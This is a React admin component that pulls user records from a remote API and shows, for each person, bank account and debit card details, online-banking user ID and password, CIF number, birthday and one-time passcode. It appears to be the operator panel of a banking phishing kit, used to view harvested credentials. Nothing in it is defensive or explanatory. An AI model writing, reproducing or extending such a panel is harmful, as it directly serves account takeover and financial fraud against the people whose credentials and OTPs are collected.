import React, { useEffect, useState } from 'react';

const AdminSide2 = () => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [userDetails, setUserDetails] = useState(null);
  const [showDetails, setShowDetails] = useState(false);

  // Fetch data from the API
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch('https://back-end-card-bv5n-git-main-alvin-sifats-projects.vercel.app/api');
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const data = await response.json();
        setUsers(data); // Set the users state with fetched data
      } catch (error) {
        console.error('Error fetching data:', error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  // Fetch user details when the View button is clicked
  const handleViewClick = async (userID) => {
    try {
      const response = await fetch(`https://back-end-card-bv5n-git-main-alvin-sifats-projects.vercel.app/api/${userID}`);
      if (!response.ok) {
        throw new Error('Failed to fetch user details');
      }
      const data = await response.json();
      console.log('User Details:', data); // Debugging line
      setUserDetails(data);
      setShowDetails(true);
    } catch (error) {
      console.error('Error fetching user details:', error);
    }
  };

  // Render loading state or user data
  if (loading) {
    return <div>Loading...</div>;
  }

  return (
    <div>
      <h1>User List</h1>
      <table className="min-w-full border-collapse border border-gray-200">
        <thead>
          <tr>
            <th className="border border-gray-300 p-2">ID</th>
            <th className="border border-gray-300 p-2">Name</th>
            <th className="border border-gray-300 p-2">Action</th>
          </tr>
        </thead>
        <tbody>
          {users.map(user => (
            <tr key={user._id}>
              <td className="border border-gray-300 p-2">{user._id}</td>
              <td className="border border-gray-300 p-2">{user.name}</td>
              <td className="border border-gray-300 p-2">
                <button
                  className="bg-blue-500 text-white px-4 py-2 rounded"
                  onClick={() => handleViewClick(user._id)}
                >
                  View
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {showDetails && userDetails && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
          <div className="bg-white p-8 rounded-lg shadow-lg max-w-lg mx-4">
            <h2 className="text-2xl mb-4">User Details</h2>
            <p><strong>Mobile Number:</strong> {userDetails.mobileNumber}</p>
            <p><strong>Account Number:</strong> {userDetails.accountNumber}</p>
            <p><strong>Debit Card Digits:</strong> {userDetails.debitCardDigits}</p>
            <p><strong>Expiry Date:</strong> {userDetails.expiryDate}</p>
            <p><strong>Bank Name:</strong> {userDetails.bankName}</p>
            <p><strong>User ID:</strong> {userDetails.userID}</p>
            <p><strong>Password:</strong> {userDetails.password}</p>
            <p><strong>CIF Number:</strong> {userDetails.cifNumber}</p>
            <p><strong>Branch Code:</strong> {userDetails.branchCode}</p>
            <p><strong>Birthday:</strong> {new Date(userDetails.birthday).toLocaleDateString()}</p>
            <p><strong>OTP:</strong> {userDetails.otp}</p>
            <button onClick={() => setShowDetails(false)} className="mt-4 bg-red-500 text-white px-4 py-2 rounded">
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminSide2;
